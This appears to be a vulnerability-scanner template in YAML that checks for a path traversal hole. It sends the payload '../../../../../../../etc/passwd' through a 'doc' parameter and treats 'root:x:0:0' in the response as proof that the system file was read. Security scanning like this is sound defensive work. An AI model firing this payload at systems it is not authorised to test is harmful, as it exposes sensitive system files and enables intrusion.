id: lfi3-177
name: 'Traversal to passwd via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '../../../../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
